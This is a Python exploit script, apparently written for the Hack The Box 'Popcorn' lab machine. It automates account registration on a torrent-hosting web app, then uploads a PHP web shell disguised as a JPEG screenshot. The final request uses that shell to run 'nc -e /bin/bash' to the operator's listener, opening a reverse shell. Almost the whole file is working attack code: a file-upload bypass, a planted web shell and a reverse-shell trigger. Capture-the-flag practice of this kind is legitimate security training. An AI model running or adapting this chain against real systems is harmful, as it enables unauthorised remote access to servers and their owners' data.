#!/usr/bin/python

# This exploit works on the Popcorn box from http://hackthebox.eu
# Push button and get User level access
# Written by Zulu CaPWN
# https://twitter.com/zulu_capwn

import requests
import random
from bs4 import BeautifulSoup

proxies = {'http': 'http://127.0.0.1:8080'}

########################
# Get listener IP/Port #
########################
lhost = raw_input('What is the listeners IP? (Do not prepend with http://) ')
lport = raw_input('What is the listeners Port? ')
print

############################
# Create registration info #
############################
rand = str(random.randint(00000000,99999999))
username = rand
password = rand
email = rand + '@gmail.com'

###########
# SESSION #
###########
session = requests.session()

############
# Register #
############
burp0_url = "http://10.10.10.6:80/torrent/users/index.php?mode=register"
burp0_cookies = {"/torrent/users/index.php": "", "/torrent/": "", "/torrent/login.php": ""}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://10.10.10.6/torrent/users/index.php?mode=register", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded"}
burp0_data={"username": username, "password": password, "password2": password, "email": email, "number": ''}
r = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, proxies=proxies)

if 'welcome' in r.text.lower():
    print 'Registration successful'
else:
    print 'uh oh'

##########
# Log in #
##########
burp0_url = "http://10.10.10.6:80/torrent/login.php"
burp0_cookies = {"/torrent/": "", "/torrent/login.php": "", "PHPSESSID": "e48bd65602a4aa6a363ebbdcc1745ae4"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://10.10.10.6/torrent/", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded"}
burp0_data={"username": username, "password": password}
r = session.post(burp0_url, headers=burp0_headers, cookies=r.cookies, data=burp0_data, proxies=proxies)

print rand, email
print 'Logged In'

##################################
# Put torrent binary into memory #
##################################
with open('nethunter.torrent', 'rb') as f:
    upload_me = f.read()

######################
# upload the torrent #
######################
print 'Uploading torrent...this may take a while'
files = {'torrent':('nethunter.torrent2', upload_me, 'application/x-bittorent'),
         'filename': (None, ''), 'type':(None, '1'), 'subtype':(None, '1'), 'user_id':(None, ''), 'anonymous2':(None, 'false'),
         'anonymous':(None, 'true'), 'autoset':(None, 'enabled'), 'info':(None, ''), 'registration':(None, 'false'),
         'hideuser':(None, 'false'), 'submit':(None, 'Upload Torrent')}
burp0_url = "http://10.10.10.6:80/torrent/torrents.php?mode=upload"
url = burp0_url
r = session.post(url, files=files, cookies=r.cookies, proxies=proxies)

if 'file upload succes...thank you!' in r.text:
    print 'File uploaded'
else:
    print 'Not sure file uploaded'

####################################################################
# this is the page with our torrent on it, were getting the id num #
####################################################################
soup = BeautifulSoup(r.text, 'html.parser')
id_complete_url = soup.find('meta', attrs={'http-equiv':'Refresh'})['content'].split('url=')[1]
id = id_complete_url.split('id=')[1]

#####################################
# get this page to bet the  cookies #
#####################################
url = 'http://10.10.10.6/torrent/edit.php?mode=edit&id=' + str(id)
r = session.get(url, proxies=proxies)

############################
# Getting simple php shell #
############################
with open('/root/Desktop/simple.php', 'r')as f:
    simple = f.read()

#########################
# now we post the shell #
#########################
print 'Uploading php shell'
files = {'file': ('shell.php', simple, 'image/jpeg'), 'submit': (None, 'Submit Screenshots')}
burp0_url = "http://10.10.10.6:80/torrent/upload_file.php?mode=upload&id=" + id
url = burp0_url
r = session.post(url,  files=files, proxies=proxies)

#######################
# trigger the exploit #
#######################
print 'Triggering exploit'
trigger_url = 'http://10.10.10.6/torrent/upload/' + id + '.php' + '?cmd=nc -n {} {} -e /bin/bash'.format(lhost, lport)
r = session.get(trigger_url, proxies=proxies)
